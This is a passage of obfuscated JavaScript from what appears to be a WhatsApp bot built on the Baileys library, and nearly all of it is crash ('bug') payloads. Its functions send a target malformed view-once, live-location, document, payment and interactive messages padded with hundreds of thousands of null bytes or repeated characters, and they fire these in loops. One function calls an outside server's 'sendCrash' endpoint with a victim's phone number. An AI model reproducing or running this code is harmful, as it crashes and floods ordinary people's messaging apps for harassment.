      await _0x4b53e5.relayMessage(_0x154e78, _0x17135f.message, _0x57cd0f ? {
        participant: {
          jid: _0x154e78
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0x1af693(_0x10de9e, _0x1449ab = false) {
      await _0x4b53e5.relayMessage(_0x10de9e, {
        extendedTextMessage: {
          text: "⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻\n" + "\n\n\n\n\n\n\n\n\n@6283846077142".repeat(25000),
          contextInfo: {
            mentionedJid: ["6283846077142@s.whatsapp.net", ...Array.from({
              length: 18000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            stanzaId: "1234567890ABCDEF",
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [{
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1"
                }]
              }
            },
            remoteJid: _0x10de9e,
            conversionSource: " X ",
            conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            conversionDelaySeconds: 10,
            forwardingScore: 9999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              caption: " X "
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻",
              body: "⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "https://www.instagram.com/raditx7",
              mediaUrl: "https://www.instagram.com/raditx7",
              containsAutoReply: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://www.instagram.com/raditx7"
            },
            groupSubject: " X ",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: " X ",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X "
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, _0x1449ab ? {
        participant: {
          jid: _0x10de9e
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0xce2e07(_0x2b2ea1) {
      await _0x4b53e5.relayMessage(_0x2b2ea1, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑" + "\0".repeat(990000)
              },
              nativeFlowMessage: {
                messageParamsJson: ""
              },
              carouselMessage: {}
            }
          }
        }
      }, {});
      let _0x4dac32 = _0x4d1a4f.readFileSync("./system/image/XY.webp");
      const _0x8a6a5c = {
        sticker: _0x4dac32
      };
      const _0x1ca98c = {
        quoted: GSZ
      };
      await _0x4b53e5.sendMessage(_0x2b2ea1, _0x8a6a5c, _0x1ca98c);
    }
    async function _0x35e614(_0x2e52c1, _0x33700d) {
      var _0x1a3ea0 = generateWAMessageFromContent(_0x2e52c1, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "x",
              degreesLongitude: "x",
              caption: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑\0",
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: _0x2e52c1,
        quoted: _0x33700d
      });
      await _0x4b53e5.relayMessage(_0x2e52c1, _0x1a3ea0.message, {
        messageId: _0x1a3ea0.key.id
      });
    }
    async function _0x28708f(_0x40eaad) {
      var _0x33bfbb = generateWAMessageFromContent(_0x40eaad, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                sequenceNumber: "0",
                jpegThumbnail: ""
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + _0x590e28 + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
                }],
                messageParamsJson: "\0".repeat(10000)
              }
            }
          }
        }
      }), {});
      _0x4b53e5.relayMessage(_0x40eaad, _0x33bfbb.message, {
        messageId: _0x33bfbb.key.id
      });
    }
    const _0x5e47a4 = "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑⃰" + "\0".repeat(50000);
    async function _0x3e7cb4(_0x43dd69, _0x3c7cf1) {
      var _0x108117 = generateWAMessageFromContent(_0x43dd69, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑" + "\0".repeat(990000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: _0x43dd69,
        quoted: _0x3c7cf1
      });
      await _0x4b53e5.relayMessage(_0x43dd69, _0x108117.message, {
        participant: {
          jid: _0x43dd69
        },
        messageId: _0x108117.key.id
      });
    }
    async function _0x46d162(_0xbd7ec0, _0x4dd01a) {
      var _0x50a01e = generateWAMessageFromContent(_0xbd7ec0, proto.Message.fromObject({
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          mimetype: "penis",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 999999999,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟" + "\0".repeat(900000),
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173"
        }
      }), {
        userJid: _0xbd7ec0,
        quoted: _0x4dd01a
      });
      await _0x4b53e5.relayMessage(_0xbd7ec0, _0x50a01e.message, {
        participant: {
          jid: _0xbd7ec0
        },
        messageId: _0x50a01e.key.id
      });
    }
    async function _0x5de474(_0x5bb016, _0x1fcb5b) {
      var _0x2f8993 = generateWAMessageFromContent(_0x5bb016, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: _0x5bb016,
        quoted: _0x1fcb5b
      });
      await _0x4b53e5.relayMessage(_0x5bb016, _0x2f8993.message, {
        participant: {
          jid: _0x5bb016
        },
        messageId: _0x2f8993.key.id
      });
    }
    async function _0x10f423(_0x1e8776, _0x18c2e2) {
      const _0x5b9d83 = {
        upload: ryozingod.waUploadToServer
      };
      var _0x32d099 = generateWAMessageFromContent(_0x1e8776, proto.Message.fromObject({
        interactiveMessage: {
          header: {
            title: "🩸⃟༑⌁⃰𝐙͈𝐲𝐫͢𝐞𝐧 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
            hasMediaAttachment: true,
            ...(await prepareWAMessageMedia({
              image: {
                url: "https://telegra.ph/file/3105b620672470f9af0c4.jpg"
              }
            }, _0x5b9d83))
          },
          body: {
            text: ""
          },
          footer: {
            text: "› ©Devilx !!"
          }
        }
      }), {
        userJid: _0x1e8776,
        quoted: _0x18c2e2
      });
      await ryozingod.relayMessage(_0x1e8776, _0x32d099.message, {
        participant: {
          jid: _0x1e8776
        },
        messageId: _0x32d099.key.id
      });
    }
    const _0x9e3a9 = {
      participant: "0@s.whatsapp.net",
      ...(_0x21f0d9.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x2b13ea = {
      key: _0x9e3a9,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: _0x4d1a4f.readFileSync("./system/image/VR.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐫͢𝐞𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    async function _0x20638e(_0xdd8868, _0x37f461 = 20) {
      for (let _0x16a53d = 0; _0x16a53d < _0x37f461; _0x16a53d++) {
        await _0x28408d(_0xdd8868);
        await _0x28408d(_0xdd8868);
        await _0x28408d(_0xdd8868);
        await _0x28408d(_0xdd8868);
        await _0x96020a(300);
        await _0x220dee(_0xdd8868);
        await _0x220dee(_0xdd8868);
        await _0x220dee(_0xdd8868);
        await _0x220dee(_0xdd8868);
        await _0x96020a(300);
        await _0x50b79c(_0xdd8868);
        await _0x50b79c(_0xdd8868);
        await _0x50b79c(_0xdd8868);
        await _0x50b79c(_0xdd8868);
        await _0x96020a(300);
        await _0x50de4f(_0xdd8868);
        await _0x50de4f(_0xdd8868);
        await _0x50de4f(_0xdd8868);
        await _0x50de4f(_0xdd8868);
        await _0x96020a(2300);
      }
    }
    async function _0x775651(_0x1225f5, _0x293cb2 = 20) {
      for (let _0x5f04d3 = 0; _0x5f04d3 < _0x293cb2; _0x5f04d3++) {
        await _0x109881(_0x1225f5);
        await _0x2e843e(_0x1225f5);
        await _0x239b9c(_0x1225f5);
        await _0x5c5ebc(_0x1225f5);
        await _0x96020a(300);
        await _0x109881(_0x1225f5);
        await _0x2e843e(_0x1225f5);
        await _0x239b9c(_0x1225f5);
        await _0x5c5ebc(_0x1225f5);
        await _0x96020a(300);
        await _0x109881(_0x1225f5);
        await _0x2e843e(_0x1225f5);
        await _0x239b9c(_0x1225f5);
        await _0x5c5ebc(_0x1225f5);
        await _0x96020a(300);
        await _0x109881(_0x1225f5);
        await _0x2e843e(_0x1225f5);
        await _0x239b9c(_0x1225f5);
        await _0x5c5ebc(_0x1225f5);
        await _0x96020a(300);
        await _0x109881(_0x1225f5);
        await _0x2e843e(_0x1225f5);
        await _0x239b9c(_0x1225f5);
        await _0x5c5ebc(_0x1225f5);
        await _0x96020a(300);
        await _0x109881(_0x1225f5);
        await _0x2e843e(_0x1225f5);
        await _0x239b9c(_0x1225f5);
        await _0x5c5ebc(_0x1225f5);
        await _0x96020a(300);
        await _0x109881(_0x1225f5);
        await _0x2e843e(_0x1225f5);
        await _0x239b9c(_0x1225f5);
        await _0x5c5ebc(_0x1225f5);
        await _0x96020a(300);
      }
    }
    async function _0x109881(_0xc32f6c) {
      let _0x331d23 = "𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 🔐";
      const _0x3138e0 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: _0x331d23,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const _0x1cb377 = {
        documentMessage: _0x3138e0,
        title: _0x331d23,
        hasMediaAttachment: true
      };
      const _0x3f8a42 = {
        text: _0x331d23
      };
      const _0x3d58e5 = {
        header: _0x1cb377,
        body: _0x3f8a42,
        nativeFlowMessage: {
          buttons: [{
            name: "call_permission_request",
            buttonParamsJson: "{}"
          }, {
            name: "cta_url",
            buttonParamsJson: "{ display_text : '𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑  ', url : '', merchant_url : '' }"
          }]
        }
      };
      const _0x36852e = {
        interactiveMessage: _0x3d58e5
      };
      const _0x1dc871 = {
        message: _0x36852e
      };
      const _0x5102a8 = {
        viewOnceMessage: _0x1dc871
      };
      await _0x4b53e5.relayMessage(_0xc32f6c, _0x5102a8, {
        participant: {
          jid: _0xc32f6c
        }
      }, {
        messageId: null
      });
    }
    async function _0x239b9c(_0x46ac08, _0x21c4b5) {
      for (let _0x3e5b96 = 0; _0x3e5b96 < 7; _0x3e5b96++) {
        await _0x46ac08.relayMessage(_0x21c4b5, {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "Oh ini yang katanya riper",
                  format: "EXTENSIONS_1"
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(1020000) + "\",\"screen_0_TextInput_1\":\"\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                  version: 3
                }
              }
            }
          }
        }, {
          participant: {
            jid: _0x21c4b5
          }
        });
      }
    }
    async function _0x2e843e(_0x454c69, _0x298814) {
      for (let _0x87c086 = 0; _0x87c086 < 7; _0x87c086++) {
        await _0x454c69.relayMessage(_0x298814, {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "Oh ini yang katanya riper",
                  format: "EXTENSIONS_1"
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(1020000) + "\",\"screen_0_TextInput_1\":\"\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                  version: 3
                }
              }
            }
          }
        }, {
          participant: {
            jid: _0x298814
          }
        });
      }
    }
    async function _0x5c5ebc(_0x293151, _0x1d8793, _0x5ec2a5, _0x1b433d, _0x165d33 = false) {
      const _0xbbec5a = {
        text: _0x5ec2a5,
        format: "EXTENSIONS_1"
      };
      await _0x293151.relayMessage(_0x1d8793, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: _0xbbec5a,
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(_0x1b433d) + "\",\"screen_0_TextInput_1\":\"anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                version: 3
              }
            }
          }
        }
      }, _0x165d33 ? {
        participant: {
          jid: _0x1d8793
        }
      } : {});
    }
    ;
    async function _0x52b53e(_0x4d7b1d) {
      try {
        const _0x105fec = await _0x53139d("http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=" + _0x4d7b1d);
        console.log(_0x3e6b4d.green("Send Bug By AkmalMods〽️"));
        console.log(_0x3e6b4d.red("InVisible⚡"));
      } catch (_0x1d748e) {
        console.error("Error Fetching Crash:", _0x1d748e);
      }
    }
    async function _0xaf37d6(_0x377edc, _0xa804e8) {
      var _0x1ed6bc = generateWAMessageFromContent(_0x377edc, proto.Message.fromObject({
        listMessage: {
          title: "ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕" + "\0".repeat(920000),
          footerText: "ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
          description: "ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
          buttonText: null,
          listType: 2,
          productListInfo: {
            productSections: [{
              title: "anjay",
              products: [{
                productId: "4392524570816732"
              }]
            }],
            productListHeaderImage: {
              productId: "4392524570816732",
              jpegThumbnail: null
            },
            businessOwnerJid: "0@s.whatsapp.net"
          }
        },
        footer: "puki",
        contextInfo: {
          expiration: 604800,
          ephemeralSettingTimestamp: "1679959486",
          entryPointConversionSource: "global_search_new_chat",
          entryPointConversionApp: "whatsapp",
          entryPointConversionDelaySeconds: 9,
          disappearingMode: {
            initiator: "INITIATED_BY_ME"
          }
        },
        selectListType: 2,
        product_header_info: {
          product_header_info_id: 292928282928,
          product_header_is_rejected: false
        }
      }), {
        userJid: _0x377edc,
        quoted: _0x8d23b4
      });
      await _0x4b53e5.relayMessage(_0x377edc, _0x1ed6bc.message, {
        participant: {
          jid: _0x377edc
        },
        messageId: _0x1ed6bc.key.id
      });
    }
    async function _0x2dbc06(_0x385a35, _0x29a8e0) {
      var _0x372fdd = generateWAMessageFromContent(_0x385a35, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "🩸⃟༑⌁⃰⃰𝐊𝐈𝐋𝐋𝐄𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕🐉 𝐁𝐔𝐆 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ✅" + "ꦾ".repeat(350000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: _0x385a35,
        quoted: _0x29a8e0
      });
      await _0x4b53e5.relayMessage(_0x385a35, _0x372fdd.message, {
        participant: {
          jid: _0x385a35
        },
        messageId: _0x372fdd.key.id
      });
    }
    async function _0x358850(_0x366402, _0x78a985) {
      const _0x231044 = {
        upload: _0x4b53e5.waUploadToServer
      };
      var _0x4f1495 = generateWAMessageFromContent(_0x366402, proto.Message.fromObject({
        interactiveMessage: {
          header: {
            title: "𝑭𝒂𝒂 𝒐𝒇𝒄 𝑪𝒓𝒂𝒔𝒉",
            hasMediaAttachment: true,
            ...(await prepareWAMessageMedia({
              image: {
                url: "https://pomf2.lain.la/f/ufz83rt.jpg"
              }
            }, _0x231044))
          },
          body: {
            text: ""
          },
          footer: {
            text: "›          #🩸⃟༑⌁⃰⃰𝐊𝐈𝐋𝐋𝐄𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕🐉"
          },
          nativeFlowMessage: {
            messageParamsJson: "\0".repeat(50000)
          }
        }
      }), {
        userJid: _0x366402,
